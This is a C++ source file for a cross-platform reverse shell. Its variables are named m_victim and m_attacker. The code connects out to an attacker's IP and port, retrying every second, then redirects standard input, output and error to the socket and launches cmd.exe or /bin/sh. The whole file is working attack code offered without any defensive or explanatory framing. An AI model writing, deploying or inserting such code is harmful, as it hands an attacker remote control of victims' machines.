#include "Socket.hpp"

namespace rsp {
    Socket::Socket(const uint16_t& port, std::string_view ip) {
        #if defined(RSP_WINDOWS)
            WSADATA wsaData;
            WSAStartup(MAKEWORD(2, 2), &wsaData);
            m_victim = WSASocket(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
        #elif defined(RSP_LINUX)
            m_victim = socket(AF_INET, SOCK_STREAM, 0);
        #endif

        m_attacker.sin_family = AF_INET;
        m_attacker.sin_port = htons(port);
        m_attacker.sin_addr.s_addr = inet_addr(ip.data());
    }

    void Socket::Connect() {
        #if defined(RSP_WINDOWS)
            while(connect(m_victim, reinterpret_cast<sockaddr*>(&m_attacker), sizeof(m_attacker)) != 0) {
                RSP_ERROR("cant connect to attacker");
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }

            RSP_LOG("connected successfully");

            _dup2(m_victim, 0);
            _dup2(m_victim, 1);
            _dup2(m_victim, 2);

            system("cmd.exe");
            WSACleanup();
        #elif defined(RSP_LINUX)
            while(connect(m_victim, reinterpret_cast<sockaddr*>(&m_attacker), sizeof(m_attacker)) != 0) {
                RSP_ERROR("cant connect to attacker");
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }

            RSP_LOG("connected successfully");

            dup2(m_victim, 0);
            dup2(m_victim, 1);
            dup2(m_victim, 2);

            execl("/bin/sh", "sh", 0);
        #endif
    }
};